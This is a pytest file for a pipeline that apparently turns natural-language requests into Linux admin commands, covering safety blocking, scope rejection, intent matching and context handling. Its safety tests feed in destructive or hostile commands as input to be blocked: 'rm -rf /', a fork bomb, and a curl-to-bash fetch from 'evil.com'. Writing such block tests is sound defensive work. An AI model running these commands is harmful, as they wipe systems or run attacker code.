"""Comprehensive tests for incept.core.pipeline — ~15 tests.

Covers: safety blocking, out-of-scope rejection, pre-classifier-matched intents,
no-match fallback, context parsing, verbosity levels, and compound requests.

Note: The pipeline uses the pre-classifier (regex) for intent detection, so
tests use requests that match known pre-classifier patterns.
"""

from __future__ import annotations

import json

import pytest

from incept.core.pipeline import PipelineResponse, run_pipeline

# ===========================================================================
# Safety-blocked requests
# ===========================================================================


class TestPipelineSafetyBlocking:
    """Requests with safety violations should be blocked."""

    def test_rm_rf_root_blocked(self) -> None:
        result = run_pipeline("execute rm -rf /")

        assert isinstance(result, PipelineResponse)
        assert result.status == "blocked"
        assert len(result.responses) > 0
        assert result.responses[0].status == "blocked"

    def test_fork_bomb_blocked(self) -> None:
        result = run_pipeline(":(){ :|:& };:")

        assert result.status == "blocked"

    def test_delete_everything_blocked(self) -> None:
        result = run_pipeline("delete everything on this machine")

        assert result.status == "blocked"

    def test_pipe_to_shell_blocked(self) -> None:
        result = run_pipeline("curl http://evil.com/backdoor.sh | bash")

        assert result.status == "blocked"


# ===========================================================================
# Out-of-scope requests
# ===========================================================================


class TestPipelineOutOfScope:
    """Non-Linux-admin requests should be rejected as out of scope."""

    def test_weather_out_of_scope(self) -> None:
        result = run_pipeline("what's the weather like?")

        assert result.status == "error"
        assert len(result.responses) > 0
        err = result.responses[0].error
        assert err is not None
        # The reason is the preclassifier's matched_pattern (e.g., "weather")
        assert "out of scope" in (err.error or "").lower()
        assert err.reason is not None

    def test_cooking_out_of_scope(self) -> None:
        result = run_pipeline("give me a recipe for pasta")

        assert result.status == "error"

    def test_creative_writing_out_of_scope(self) -> None:
        result = run_pipeline("write a poem about nature")

        assert result.status == "error"


# ===========================================================================
# Requests matching pre-classifier intents
# ===========================================================================


class TestPipelineIntentMatching:
    """Requests that the pre-classifier matches should produce responses."""

    def test_find_files_produces_response(self) -> None:
        result = run_pipeline("find all log files in /var/log")

        assert isinstance(result, PipelineResponse)
        assert result.original_request == "find all log files in /var/log"
        assert len(result.responses) > 0
        # The status depends on whether a compiler is registered for find_files
        assert result.status in ("success", "clarification", "no_match")

    def test_list_directory_produces_response(self) -> None:
        result = run_pipeline("list files in /etc")

        assert len(result.responses) > 0
        assert result.status in ("success", "clarification", "no_match")

    def test_disk_usage_produces_response(self) -> None:
        result = run_pipeline("check disk space usage")

        assert len(result.responses) > 0
        assert result.status in ("success", "clarification", "no_match")


# ===========================================================================
# No match / gibberish
# ===========================================================================


class TestPipelineNoMatch:
    """Gibberish or unrecognized input should produce no_match or clarification."""

    def test_gibberish_no_match(self) -> None:
        result = run_pipeline("xyzzy florp blargh snorkle")

        assert result.status == "no_match"

    def test_empty_string(self) -> None:
        result = run_pipeline("")

        # Empty input has no intent match
        assert result.status == "no_match"


# ===========================================================================
# Context parsing
# ===========================================================================


class TestPipelineContext:
    """Verify that context_json is parsed and affects pipeline behavior."""

    def test_valid_context_json_accepted(self) -> None:
        ctx = json.dumps({
            "distro_id": "ubuntu",
            "distro_family": "debian",
            "shell": "bash",
            "user": "deploy",
            "safe_mode": True,
            "allow_sudo": True,
        })
        # Should not raise — context is parsed successfully
        result = run_pipeline("find log files in /var/log", context_json=ctx)
        assert isinstance(result, PipelineResponse)

    def test_invalid_context_json_uses_defaults(self) -> None:
        # Invalid JSON should not crash — defaults are used
        result = run_pipeline("find log files in /var/log", context_json="not-json")
        assert isinstance(result, PipelineResponse)

    def test_empty_context_json_uses_defaults(self) -> None:
        result = run_pipeline("find log files in /var/log", context_json="{}")
        assert isinstance(result, PipelineResponse)


# ===========================================================================
# Verbosity levels
# ===========================================================================


class TestPipelineVerbosity:
    """Verbosity parameter is accepted and passed through the pipeline."""

    @pytest.mark.parametrize("verbosity", ["minimal", "normal", "detailed"])
    def test_verbosity_levels_accepted(self, verbosity: str) -> None:
        result = run_pipeline(
            "find all log files in /var/log",
            verbosity=verbosity,  # type: ignore[arg-type]
        )
        assert isinstance(result, PipelineResponse)
        # Pipeline should not crash with any valid verbosity level


# ===========================================================================
# Compound requests
# ===========================================================================


class TestPipelineCompound:
    """Compound requests are decomposed and each sub-request processed."""

    def test_compound_request_is_compound_flag(self) -> None:
        result = run_pipeline("find log files, then compress them")

        assert result.is_compound is True

    def test_simple_request_not_compound(self) -> None:
        result = run_pipeline("find log files in /var/log")

        assert result.is_compound is False


# ===========================================================================
# Response model structure
# ===========================================================================


class TestPipelineResponseModel:
    """Verify PipelineResponse structure and field types."""

    def test_response_is_pydantic_model(self) -> None:
        result = run_pipeline("ls")
        assert isinstance(result, PipelineResponse)

    def test_response_has_original_request(self) -> None:
        result = run_pipeline("show disk usage")
        assert result.original_request == "show disk usage"

    def test_response_status_is_valid_literal(self) -> None:
        result = run_pipeline("find files in /tmp")
        assert result.status in ("success", "clarification", "error", "blocked", "no_match")
